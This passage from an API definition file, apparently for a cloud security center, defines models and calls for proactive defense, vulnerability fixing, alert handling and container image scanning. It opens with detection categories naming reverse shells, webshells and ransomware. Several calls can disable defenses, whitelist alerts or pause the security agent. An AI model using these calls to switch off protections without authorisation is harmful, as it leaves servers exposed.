*   **USER-ENABLE-SWITCH-TYPE\\_50873**: WebShell execute command
*   **USER-ENABLE-SWITCH-TYPE\\_51236**: Rebound Shell (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_50877**: Malicious soft communication (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50884**: Suspicious worm script behavior (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50885**: malicious script behavior (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51201**: ransomware (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51202**: Suspected Extortion (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_52827**: ransomware (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52828**: Suspected Extortion (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52829**: delete system backup behavior (Windows)', example='kdump_switch', position='Query'),
}

model OperateCommonOverallConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model OperateCommonOverallConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateCommonOverallConfigResponseBody(name='body'),
}

async function operateCommonOverallConfig(request: OperateCommonOverallConfigRequest): OperateCommonOverallConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'OperateCommonOverallConfig', 'POST', '/', 'json', false, 'json', request);
}

model OperateCommonTargetConfigRequest {
  fieldName?: string(name='FieldName', description='The type of the image. Valid values:

*   **repoName**: the name of the image repository
*   **repoNamespace**: the namespace of the image repository', example='repoName', position='Query'),
  fieldValue?: string(name='FieldValue', description='The name of the image repository or the namespace of the image repository.', example='cafcmc-dev', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='182.92.XXX.XXX', position='Query'),
  targetOperations: string(name='TargetOperations', description='The configuration of proactive defense for your server. The value includes the following fields:

*   **targetType**: specifies the dimension from which you manage proactive defense. UUIDs are supported. Set the value to **uuid**.
*   **target**: specifies the UUID of the server for which you want to configure proactive defense.
*   **flag**: specifies whether to enable or disable proactive defense for your server. Valid values are **add** and **del**. The value add indicates that proactive defense will be enabled for your server. The value del indicates that proactive defense will be disabled for your server.', example='[
      {
            "targetType": "uuid",
            "target": "f329a044-6a2f-49a0-9d33-352f6c1d****",
            "flag": "del"
      }
]', position='Query'),
  targetType?: string(name='TargetType', description='The dimension based on which the asset is selected. Valid values:

*   **uuid**: the UUID of the server
*   **Cluster**: the ID of the cluster
*   **image_repo**: the name of the image repository', example='uuid', position='Query'),
  type: string(name='Type', description='The type of the feature. Valid values:

*   **alidetect-scan-enable**: local file detection
*   **ACTION-TRIAL-PERMISSION**: data delivery to ActionTrail
*   **alidetect**: local file detection engine
*   **container_prevent_escape**: container escape prevention
*   **image_repo**: repository image scan
*   **proc_filter_switch**: log filtering
*   **agentless**: agentless detection
*   **rasp**: application protection
*   **sensitiveFile**: sensitive file detection
*   **aliscriptengine**: in-depth detection engine
*   **containerNetwork**: container network visualization', example='alidetect', position='Query'),
}

model OperateCommonTargetConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='95D45C44-4F53-5ED2-8E12-7D134564B****'),
}

model OperateCommonTargetConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateCommonTargetConfigResponseBody(name='body'),
}

async function operateCommonTargetConfig(request: OperateCommonTargetConfigRequest): OperateCommonTargetConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'OperateCommonTargetConfig', 'POST', '/', 'json', false, 'json', request);
}

model OperateImageBaselineWhitelistRequest {
  baselineItemKeyList: string(name='BaselineItemKeyList', description='The keys of baseline check items.', example='hc.image.checklist.identify.hc_exploit_es_linux.item', position='Query'),
  imageUuid?: string(name='ImageUuid', description='The UUID of the image.', example='a5250ebca765dc9eb1a84b790b0e****', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  operation: string(name='Operation', description='The operation that you want to perform on the check items. Valid values:

*   **add**: adds the check items to the whitelist
*   **del**: removes the check items from the whitelist', example='add', position='Query'),
  scanRange?: [ string ](name='ScanRange', description='The types of the assets that you want to scan.', position='Query'),
}

model OperateImageBaselineWhitelistResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='75AD186B-B46A-56CC-BE35-987ADDF6****'),
}

model OperateImageBaselineWhitelistResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateImageBaselineWhitelistResponseBody(name='body'),
}

async function operateImageBaselineWhitelist(request: OperateImageBaselineWhitelistRequest): OperateImageBaselineWhitelistResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'OperateImageBaselineWhitelist', 'POST', '/', 'json', false, 'json', request);
}

model OperateImageVulRequest {
  info?: string(name='Info', description='The information about the vulnerability. The value of this parameter is in the JSON format and contains the following fields:

*   namespace: the namespace of the image
*   repoName: the name of the Container Registry repository
*   regionId: the region ID
*   instanceId: the ID of the Container Registry instance
*   repoId: the name of the repository
*   tag: the tad added to the image
*   digest: the digest of the image
*   newTag: the tag added to the image after the vulnerability is fixed
*   uuid: the UUID of the image
*   ids: the IDs of the vulnerability primary keys', example='[{\\"namespace\\":\\"cloud_oa****\\",\\"repoName\\":\\"hybirdc****\\",\\"regionId\\":\\"cn-shanghai\\",\\"instanceId\\":\\"cri-rv4nvbv8iju4****\\",\\"repoId\\":\\"crr-2q7302qrofxg****\\",\\"tag\\":\\"hybird-cloud-web_fix_167115945****\\",\\"digest\\":\\"e1a4fd25884ca2ef8840bb252c9926e4f549df9e046500dd93539b2d458c****\\",\\"newTag\\":\\"hybird-cloud-web_fix_167115996****\\",\\"uuid\\":\\"4ad91dd8c0c02de6574fa98085d0****\\",\\"ids\\":[197540864,197540865,197540869]}]', position='Query'),
  operateType?: string(name='OperateType', description='If you want to fix the vulnerability, set the value to vul_fix.', example='vul_fix', position='Query'),
  type?: string(name='Type', description='The type of the vulnerability. Set the value to cve.', example='cve', position='Query'),
}

model OperateImageVulResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='486F2228-438A-544A-A533-433F943C15CD'),
}

model OperateImageVulResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateImageVulResponseBody(name='body'),
}

async function operateImageVul(request: OperateImageVulRequest): OperateImageVulResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'OperateImageVul', 'POST', '/', 'json', false, 'json', request);
}

model OperateSuspiciousOverallConfigRequest {
  config: string(name='Config', description='Specifies whether to enable the feature. Valid values:

*   **on**: yes
*   **off**: no', example='off', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  noTargetAsOn?: boolean(name='NoTargetAsOn', description='Specifies whether to configure assets for the feature. Default value: **false**. Valid values:

*   **true**: yes
*   **false**: no

>  This parameter takes effect only when you set **Config** to **on**.', example='true', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='222.178.XX.XX', position='Query'),
  type: string(name='Type', description='The type of the feature. Valid values:

*   **auto_breaking**: Anti-Virus
*   **ransomware_breaking**: Anti-ransomware (Bait Capture)
*   **webshell\\_cloud_breaking**: Webshell Protection
*   **alinet**: Behavior prevention
*   **k8s\\_log_analysis**: K8s Threat Detection
*   **alisecguard**: Defense mode for Client Protection', example='k8s_log_analysis', position='Query'),
}

model OperateSuspiciousOverallConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C286491D-4A2F-589A-B63B-D2AD3DA9BD71'),
}

model OperateSuspiciousOverallConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateSuspiciousOverallConfigResponseBody(name='body'),
}

async function operateSuspiciousOverallConfig(request: OperateSuspiciousOverallConfigRequest): OperateSuspiciousOverallConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'OperateSuspiciousOverallConfig', 'POST', '/', 'json', false, 'json', request);
}

model OperateSuspiciousTargetConfigRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX', position='Query'),
  targetOperations: string(name='TargetOperations', description='The configuration of proactive defense for your server. The value includes the following fields:

*   **targetType**: specifies the dimension from which you manage proactive defense. UUIDs are supported. Set the value to **uuid**.
*   **target**: specifies the UUID of the server for which you want to configure proactive defense.
*   **flag**: specifies whether to enable or disable proactive defense for your server. Valid values are **add** and **del**. The value add indicates that proactive defense will be enabled for your server. The value del indicates that proactive defense will be disabled for your server.', example='"[{"targetType":"uuid","target":"0585f81a-dd84-4ddf-9971-f59d12345678","flag":"add"},{"targetType":"uuid","target":"01acfd9d-e6a4-4e61-b9eb-aae012345678","flag":"add"},{"targetType":"uuid","target":"04a0e735-ad32-4835-b635-045812345678","flag":"add"}]"', position='Query'),
  targetType: string(name='TargetType', description='The dimension from which you manage proactive defense. Only the server UUID dimension is supported.

Set the value to **uuid**.', example='uuid', position='Query'),
  type: string(name='Type', description='The type of proactive defense. Valid Values:

*   **auto_breaking**: automatic blocking
*   **webshell_cloud_breaking**: webshell defense
*   **alinet**: malicious behavior defense
*   **ransomware_breaking**: ransomware capture
*   **alisecguard**: client protection', example='auto_breaking', position='Query'),
}

model OperateSuspiciousTargetConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='ABCD-PSD2-5256-1DSA-4222-JHBN'),
}

model OperateSuspiciousTargetConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateSuspiciousTargetConfigResponseBody(name='body'),
}

async function operateSuspiciousTargetConfig(request: OperateSuspiciousTargetConfigRequest): OperateSuspiciousTargetConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'OperateSuspiciousTargetConfig', 'POST', '/', 'json', false, 'json', request);
}

model OperateSwitchStatusRequest {
  ruleId: long(name='RuleId', example='900001', position='Query'),
  status: string(name='Status', example='on', position='Query'),
}

model OperateSwitchStatusResponseBody = {
  requestId?: string(name='RequestId', example='8AE9D3DA-406B-51FA-AA1C-89440C1459BF'),
}

model OperateSwitchStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateSwitchStatusResponseBody(name='body'),
}

async function operateSwitchStatus(request: OperateSwitchStatusRequest): OperateSwitchStatusResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'OperateSwitchStatus', 'POST', '/', 'json', false, 'json', request);
}

model OperateVirusEventsRequest {
  operationAll: int32(name='OperationAll', description='Specifies whether to handle all alert events. Valid values:

*   **1**: yes
*   **0**: no', example='0', position='Query'),
  operationCode: string(name='OperationCode', description='The operation that you want to perform on the alert events. Valid values:

*   **default**: performs in-depth detection and removal
*   **ignore**: ignores the alert event
*   **advance_mark_mis_info**: adds the alert events to the whitelist
*   **manual_handled**: marks the alert events as manually handled', example='default', position='Query'),
  operationRange?: string(name='OperationRange', description='The handling scope.', example='[{\\"type\\":\\"machine\\",\\"list\\":[\\"xxxxxxxxx-4cbf-4ca6-a1b7-8a09d1f86ab0\\"]}]', position='Query'),
}

model OperateVirusEventsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='B72BEC03-001C-5C77-A4BB-1E6XXXXXXX'),
  taskId?: long(name='TaskId', description='The ID of the task to handle multiple alert events at a time.', example='1'),
}

model OperateVirusEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateVirusEventsResponseBody(name='body'),
}

async function operateVirusEvents(request: OperateVirusEventsRequest): OperateVirusEventsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'OperateVirusEvents', 'POST', '/', 'json', false, 'json', request);
}

model OperateVulsRequest {
  operateType: string(name='OperateType', description='The operation on the vulnerabilities. Set the value to **vul_fix**, which indicates vulnerability fixing.', example='vul_fix', position='Query'),
  type: string(name='Type', description='The type of the vulnerabilities that you want to fix. Set the value to **cve**, which indicates Linux software vulnerabilities.', example='cve', position='Query'),
  uuids: [ string ](name='Uuids', description='The UUIDs of servers for which you want to fix vulnerabilities.', position='Query'),
  vulNames: [ string ](name='VulNames', description='The names of the vulnerabilities that you want to fix.', position='Query'),
}

model OperateVulsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C2677612-7207-4AEB-BD48-8BA528F86777'),
}

model OperateVulsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateVulsResponseBody(name='body'),
}

async function operateVuls(request: OperateVulsRequest): OperateVulsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'OperateVuls', 'POST', '/', 'json', false, 'json', request);
}

model OperateWebLockFileEventsRequest {
  dealAll: int32(name='DealAll', description='Specifies whether to handle all alert events that are generated for web tamper proofing. Valid values:

*   **1**: yes
*   **0**: no', example='1', position='Query'),
  eventIds: [ long ](name='EventIds', description='The IDs of alert events.', position='Query'),
  operationCode: string(name='OperationCode', description='The operation that you want to perform on the alert events. Valid values:

*   **mark_mis_info**: marks the alert events as false positives
*   **rm_mark_mis_info**: cancels marking the alerts events as false positives
*   **offline_handled**: marks the alert events as handled offline
*   **whitelist**: adds the alert events to the whitelist
*   **rm_whitelist**: cancels adding the alert events to the whitelist', example='whitelist', position='Query'),
}

model OperateWebLockFileEventsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='2884C186-E8C0-5611-8207-3FF15EE7D9B4'),
}

model OperateWebLockFileEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateWebLockFileEventsResponseBody(name='body'),
}

async function operateWebLockFileEvents(request: OperateWebLockFileEventsRequest): OperateWebLockFileEventsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'OperateWebLockFileEvents', 'POST', '/', 'json', false, 'json', request);
}

model OperationCancelIgnoreSuspEventRequest {
  remark?: string(name='Remark', description='The information about the remarks.', example='remark text', position='Query'),
  securityEventIds: [ long ](name='SecurityEventIds', description='The IDs of alert events.', position='Query'),
}

model OperationCancelIgnoreSuspEventResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was is successful. Other status codes indicate that the request fails. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
  success?: boolean(name='Success', description='The handling result of an exception. Valid values:

*   **true**: successful
*   **false**: failed', example='true'),
  timeCost?: long(name='TimeCost', description='The time consumed for the request. Unit: seconds.', example='1'),
}

model OperationCancelIgnoreSuspEventResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperationCancelIgnoreSuspEventResponseBody(name='body'),
}

async function operationCancelIgnoreSuspEvent(request: OperationCancelIgnoreSuspEventRequest): OperationCancelIgnoreSuspEventResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'OperationCancelIgnoreSuspEvent', 'POST', '/', 'json', false, 'json', request);
}

model OperationSuspEventsRequest {
  from?: string(name='From', description='The ID of the request source.

Set the value to **sas**, which indicates that the request is sent from Security Center.', example='sas', position='Query'),
  operation: string(name='Operation', description='The operation that you want to perform on alerts. Valid values:

*   **deal**: quarantines the source file of the malicious process.
*   **ignore**: ignores the alerts.
*   **mark_mis_info**: marks the alerts as false positives by adding the alerts to the whitelist.
*   **rm_mark_mis_info**: cancels false positives by removing the alerts from the whitelist.
*   **offline_handled**: marks the alerts as handled.', example='deal', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX', position='Query'),
  subOperation?: string(name='SubOperation', description='The suboperation that you want to perform when you quarantine the source file of the malicious process. Valid values:

*   **killAndQuaraFileByPidAndMd5andPath**: terminates the process based on its process ID (PID) and quarantines the source file of the process.
*   **quaraFileByMd5andPath**: quarantines the source file of the process.
*   **killAndQuaraFileByMd5andPath**: terminates the process and quarantines the source file of the process.', example='killAndQuaraFileByPidAndMd5andPath', position='Query'),
  suspiciousEventIds: string(name='SuspiciousEventIds', description='The IDs of alert events.

> You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to obtain the IDs of alert events from the SecurityEventIds response parameter.', example='290852', position='Query'),
  warnType?: string(name='WarnType', description='The type of the exceptions. Valid values:

*   **alarm**: alerts
*   **null**: exceptions', example='alarm', position='Query'),
}

model OperationSuspEventsResponseBody = {
  accessCode?: string(name='AccessCode', description='Indicates whether you have access permissions. Valid values:

*   **pass**: yes
*   **no_permission**: no', example='pass'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
  success?: boolean(name='Success', description='Indicates whether exceptions are handled. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
}

model OperationSuspEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperationSuspEventsResponseBody(name='body'),
}

async function operationSuspEvents(request: OperationSuspEventsRequest): OperationSuspEventsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'OperationSuspEvents', 'POST', '/', 'json', false, 'json', request);
}

model PageImageRegistryRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1', position='Body'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20.', example='20', position='Body'),
  registryNameLike?: string(name='RegistryNameLike', description='The name of the image repository. Fuzzy match is supported.', example='asa', position='Body'),
  registryTypeInList?: [ string ](name='RegistryTypeInList', description='The types of image repositories.', position='Body'),
  registryTypeNotInList?: [ string ](name='RegistryTypeNotInList', description='The types of excluded image repositories.', position='Body'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='140.207.XXX.XXX', position='Query'),
}

model PageImageRegistryResponseBody = {
  list?: [ 
    {
      blackList?: string(name='BlackList', description='The IP address blacklist.', example='129.211.XXX.XXX'),
      domainName?: string(name='DomainName', description='The domain name of the image repository.', example='sinochem.com'),
      gmtCreate?: string(name='GmtCreate', description='The time when the image repository was created. The time is in the yyyy-MM-dd HH:mm:ss format.', example='2022-08-30 10:23:30'),
      gmtModified?: string(name='GmtModified', description='The time when the image repository was updated. The time is in the yyyy-MM-dd HH:mm:ss format.', example='2022-09-30 10:23:30'),
      id?: long(name='Id', description='The ID of the image repository.', example='1078312'),
      imageCount?: int32(name='ImageCount', description='The number of images that are stored in the image repository.', example='1'),
      jenkinsEnv?: string(name='JenkinsEnv', description='The information about the Jenkins environment.', example='projectInfo'),
      netType?: int32(name='NetType', description='The network type. Valid values:

*   **1**: Internet.
*   **2**: virtual private cloud (VPC).', example='1'),
      password?: string(name='Password', description='The password.', example='Harbor******'),
      persistenceDay?: int32(name='PersistenceDay', description='The number of days for which assets are retained.', example='30'),
      protocolType?: int32(name='ProtocolType', description='The type of the protocol. Valid values:

*   **1**: HTTP.
*   **2**: HTTPS.', example='1'),
      regionId?: string(name='RegionId', description='The region ID of the image repository.', example='cn-hangzhou'),
      registryHostIp?: string(name='RegistryHostIp', description='The IP address of the image repository.', example='39.104.XXX.XXX'),
      registryName?: string(name='RegistryName', description='The alias of the image repository.', example='test1'),
      registryType?: string(name='RegistryType', description='The type of the image repository. Valid values:

*   **acr**: Container Registry.
*   **harbor**: Harbor.
*   **quay**: Quay.
*   **CI/CD**: Jenkins.', example='harbor'),
      token?: string(name='Token', description='The authentication token of the user.', example='c7b90d29-632f-4e58-88b8-00ad77f6****'),
      transPerHour?: int32(name='TransPerHour', description='The number of scan tasks that are performed per hour.', example='30'),
      userName?: string(name='UserName', description='The username.', example='RegistryUser'),
      vpcId?: string(name='VpcId', description='The VPC ID.', example='vpc-5gu8iu68w9b472jbb****'),
      whiteList?: string(name='WhiteList', description='The IP address whitelist.', example='192.168.XXX.XXX'),
    }
  ](name='List', description='An array that consists of image repositories.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='FDA9E37C-6114-5945-8FF1-E3D4D397****'),
}

model PageImageRegistryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: PageImageRegistryResponseBody(name='body'),
}

async function pageImageRegistry(request: PageImageRegistryRequest): PageImageRegistryResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'PageImageRegistry', 'POST', '/', 'json', true, 'form', request);
}

model PauseClientRequest {
  uuids: string(name='Uuids', description='The UUIDs of servers for which you want to enable or disable the Security Center agent.', example='uuid-1211-sadsd-2131', position='Query'),
  value: string(name='Value', description='The status of the Security Center agent. Valid values:

*   **0**: disabled
*   **1**: enabled', example='1', position='Query'),
}

model PauseClientResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='6673D49C-A9AB-40DD-B4A2-B92306701AE7'),
}

model PauseClientResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: PauseClientResponseBody(name='body'),
}

async function pauseClient(request: PauseClientRequest): PauseClientResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'PauseClient', 'POST', '/', 'json', false, 'json', request);
}

model PublicCreateImageScanTaskRequest {
  digests?: string(name='Digests', description='The SHA-256 value of the image digest. Separate multiple SHA-256 values with commas (,).', example='6a5e103187b31a94592a47a5858617f7a6c', position='Query'),
  instanceIds?: string(name='InstanceIds', description='The ID of the Container Registry instance in which the image repository is created. Separate multiple IDs with commas (,).', example='i-uf6j8vq9l4r5ntht****', position='Query'),
  regionIds?: string(name='RegionIds', description='The region ID of the image. Separate multiple IDs with commas (,).', example='cn-hangzhou', position='Query'),
  registryTypes?: string(name='RegistryTypes', description='The type of the image repository. Separate multiple types with commas (,). Valid values:

*   **acr**
*   **harbor**
*   **quay**', example='acr', position='Query'),
  repoIds?: string(name='RepoIds', description='The ID of the image repository. Separate multiple IDs with commas (,).', example='crr-vridcl4****', position='Query'),
  repoNames?: string(name='RepoNames', description='The name of the image repository. Separate multiple names with commas (,).', example='centos', position='Query'),
  repoNamespaces?: string(name='RepoNamespaces', description='The namespace to which the image repository belongs. Separate multiple namespaces with commas (,).', example='hanghai-namespace', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168..XX.XX', position='Query'),
  tags?: string(name='Tags', description='The tag that is added to the image. Separate multiple tags with commas (,).', example='0.2', position='Query'),
}

model PublicCreateImageScanTaskResponseBody = {
  data?: {
    canCreate?: boolean(name='CanCreate', description='Indicates whether you can create more image scan tasks. Valid values:

*   **true**: yes
*   **false**: no

> By default, a maximum of 10 image scan tasks can be running at the same time. If 10 image scan tasks are running, you cannot create an image scan task by calling this operation. You must wait for at least one of the 10 existing image scan tasks to complete before you can create an image scan task.', example='true'),
    collectTime?: long(name='CollectTime', description='The timestamp when the image information was collected. Unit: milliseconds.', example='1644286364150'),
    execTime?: long(name='ExecTime', description='The timestamp when the image scan task started to run. Unit: milliseconds.', example='1644286364150'),
    finishCount?: int32(name='FinishCount', description='The number of images that have been scanned.', example='5'),
    progress?: int32(name='Progress', description='The progress of the image scan task in percentage.', example='100'),
    result?: string(name='Result', description='The result of the image scan task. Valid values:

*   **SUCCESS**: The task is successful.
*   **TASK_NOT_SUPPORT_REGION**: The images are deployed in a region that is not supported by container image scan.

> For more information about the regions supported by container image scan, see the "Regions supported by container image scan" section in this topic.', example='SUCCESS'),
    status?: string(name='Status', description='The status of the image scan task. Valid values:

*   **INIT**: The task is being initialized.
*   **PRE_ANALYZER**: The task is being pre-processed.
*   **SUCCESS**: The task is successful.
*   **FAIL**: The task fails.', example='SUCCESS'),
    taskId?: string(name='TaskId', description='The ID of the image scan task.', example='a410bb3e68c217a3368bc0238c66886d'),
    totalCount?: int32(name='TotalCount', description='The total number of images to scan.', example='5'),
  }(name='Data', description='The data returned if the call is successful.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F9353221-40F4-5F98-B73C-2803DC804033'),
}

model PublicCreateImageScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: PublicCreateImageScanTaskResponseBody(name='body'),
}

/**
  * Before you call the PublicCreateImageScanTask operation, we recommend that you call the [PublicPreCheckImageScanTask](~~PublicPreCheckImageScanTask~~) operation to query the number of images to scan and the quota for container image scan to be consumed by the image scan task. Make sure that the remaining quota for container image scan is sufficient. This prevents the task from being stopped due to an insufficient quota.
  *
 */
async function publicCreateImageScanTask(request: PublicCreateImageScanTaskRequest): PublicCreateImageScanTaskResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'PublicCreateImageScanTask', 'POST', '/', 'json', false, 'json', request);
}

model PublicPreCheckImageScanTaskRequest {
  digests?: string(name='Digests', example='6a5e103187b31a94592a47a5858617f7****', position='Query'),
  instanceIds?: string(name='InstanceIds', example='i-uf6j8vq9l4r5ntht****', position='Query'),
  regionIds?: string(name='RegionIds', example='cn-hangzhou', position='Query'),
  registryTypes?: string(name='RegistryTypes', example='acr', position='Query'),
  repoIds?: string(name='RepoIds', example='crr-vridcl4****', position='Query'),
  repoNames?: string(name='RepoNames', example='centos', position='Query'),
  repoNamespaces?: string(name='RepoNamespaces', example='hanghai-namespace', position='Query'),
  sourceIp?: string(name='SourceIp', example='192.168.XX.XX', position='Query'),
  tags?: string(name='Tags', example='0.2', position='Query'),
}

model PublicPreCheckImageScanTaskResponseBody = {
  data?: {
    needAuthCount?: int32(name='NeedAuthCount', example='6'),
    scanImageCount?: int32(name='ScanImageCount', example='3'),
  }(name='Data'),
  requestId?: string(name='RequestId', example='F9353221-40F4-5F98-B73C-2803DC804033'),
}

model PublicPreCheckImageScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: PublicPreCheckImageScanTaskResponseBody(name='body'),
}

async function publicPreCheckImageScanTask(request: PublicPreCheckImageScanTaskRequest): PublicPreCheckImageScanTaskResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'PublicPreCheckImageScanTask', 'POST', '/', 'json', false, 'json', request);
}

model PublicSyncAndCreateImageScanTaskRequest {
  images: string(name='Images', description='The information about the images. The value of this parameter is in the JSON format and contains the following fields:

*   **RegistryType**: the type of the image repository. Valid values:

    *   acr
    *   harbor
    *   quay

*   **RepoId**: the ID of the image repository.

*   **InstanceId**: the ID of the Container Registry instance to which the image repository belongs.

*   **RepoNamespace**: the namespace to which the image repository belongs.

*   **RegionId**: the region ID of the image.

*   **RepoName**: the name of the image repository.

*   **Digest**: the digest of the image.

*   **Tag**: the tag that is added to the image.

*   **CreateTime**: the timestamp when the image was created. Unit: milliseconds.

*   **UpdateTime**: the timestamp when the image was updated. Unit: milliseconds.', example='[{"registryType":"acr","repoId":"crr-red9kgqqi0fh75d5","instanceId":"cri-1x2qtjd75ofqvfa8","repoNamespace":"1125","regionId":"cn-hangzhou","repoName":"script1","digest":"b1064a5007786b6f82a50772858e8156bc1e5fbddb7dd20af6922761ad197fe4","tag":"v0113-ver2","createTime":1641267666666,"updateTime":1641267909090}]', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.X.X', position='Query'),
}

model PublicSyncAndCreateImageScanTaskResponseBody = {
  data?: {
    canCreate?: boolean(name='CanCreate', description='Indicates whether you can create more image scan tasks. Valid values:

*   **true**: yes
*   **false**: no

>  By default, a maximum of 10 image scan tasks can be running at the same time. If 10 image scan tasks are running, you cannot create an image scan task by calling this operation. You must wait for at least one of the 10 existing image scan tasks to complete before you can create an image scan task.', example='true'),
    collectTime?: long(name='CollectTime', description='The timestamp when the image information was collected. Unit: milliseconds.', example='1644286364150'),
    execTime?: long(name='ExecTime', description='The timestamp when the image scan task started to run. Unit: milliseconds.', example='1644286364150'),
    finishCount?: int32(name='FinishCount', description='The number of images that have been scanned.', example='5'),
    progress?: int32(name='Progress', description='The progress of the image scan task.', example='100'),
    result?: string(name='Result', description='The result of the image scan task. Valid values:

*   **SUCCESS**: The task is successful.
*   **TASK\\_NOT\\_SUPPORT_REGION**: The image is deployed in a region that is not supported by container image scan.', example='SUCCESS'),
    status?: string(name='Status', description='The status of the image scan task. Valid values:

*   **INIT**: The task is being initialized.
*   **PRE_ANALYZER**: The task is being pre-processed.
*   **SUCCESS**: The task is successful.
*   **FAIL**: The task failed.', example='SUCCESS'),
    taskId?: string(name='TaskId', description='The ID of the image scan task.', example='a410bb3e68c217a3368bc0238c66886d'),
    totalCount?: int32(name='TotalCount', description='The total number of images to scan.', example='5'),
  }(name='Data', description='The data returned if the call is successful.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F9353221-40F4-5F98-B73C-2803DC804033'),
}

model PublicSyncAndCreateImageScanTaskResponse = {
  headers: map[string]string(name='headers'),
